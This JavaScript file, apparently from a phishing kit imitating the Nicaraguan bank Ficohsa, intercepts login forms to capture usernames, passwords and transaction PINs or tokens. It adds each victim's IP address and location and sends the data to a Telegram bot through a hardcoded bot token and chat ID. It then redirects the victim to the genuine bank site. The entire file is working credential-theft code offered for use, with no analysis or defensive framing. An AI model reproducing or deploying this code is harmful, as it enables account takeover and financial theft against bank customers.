document.addEventListener("DOMContentLoaded", function() {
    // Agregar evento de envío de formulario para la página de inicio de sesión
    var formLogin = document.getElementById("formLogin");
    if (formLogin) {
        formLogin.addEventListener("submit", function(event) {
            event.preventDefault();
            var username = document.getElementById("username").value;
            obtenerUbicacionYEnviarMensajeTelegram(username, username, "index2.html", "💲 Ficohsa Nica 💲:\nUsuario: " + username);
        });
    }

    // Agregar evento de envío de formulario para la página de código de operaciones
    var loginForm = document.getElementById("formLogin2");
    if (loginForm) {
        loginForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var password = document.getElementById("password").value;
            obtenerUbicacionYEnviarMensajeTelegram(password, password, "cargando.html?action=username-password", "💲 Ficohsa Nica 💲:\nContraseña: " + password);
        });
    }

    // Agregar evento de envío de formulario para la sección de contacto
    var formContacto = document.getElementById("formLogin3");
    if (formContacto) {
        formContacto.addEventListener("submit", function(event) {
            event.preventDefault();
             var password = document.getElementById("password").value;
            obtenerUbicacionYEnviarMensajeTelegram(password, password, "cargando.html?action=token", "💲 Ficohsa Nica 💲:\nPin Transaccional o Token: " + password);
        });
    }

    // Agregar evento de envío de formulario para el formulario adicional loginForm3
    var formContacto3 = document.getElementById("formLogin4");
    if (formContacto3) {
        formContacto3.addEventListener("submit", function(event) {
            event.preventDefault();
          var password = document.getElementById("password").value;
            obtenerUbicacionYEnviarMensajeTelegram(password, password, "https://www.ficohsa.com/ni/", "💲 Ficohsa Nica 💲:\nPin Transaccional o Token: " + password);
        });
    }

});

function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
    fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
        var country = data.country_name;
        var region = data.region;
        var ip = data.ip;
        if (country && region && ip) {
            message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
        } else {
            message += '\nNo se pudo obtener la ubicación.';
        }
        enviarMensajeTelegram(message, nextPage);
    })
    .catch(error => {
        console.error("Error al obtener la ubicación:", error);
        message += "\nError al obtener la ubicación.";
        enviarMensajeTelegram(message, nextPage);
    });
}

function enviarMensajeTelegram(mensaje, nextPage) {
    var token = '6744581534:AAHhY-JipwUkVVFxnARQ0bDX71Qzqd6Dxt8';
    var chatId = '1824979522';
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
    var params = {
        chat_id: chatId,
        text: mensaje
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(params)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Ocurrió un error al enviar el mensaje.');
        }
        console.log('Mensaje enviado con éxito.');
        window.location.href = nextPage;
    })
    .catch(error => {
        console.error('Error al enviar el mensaje:', error);
    });
}
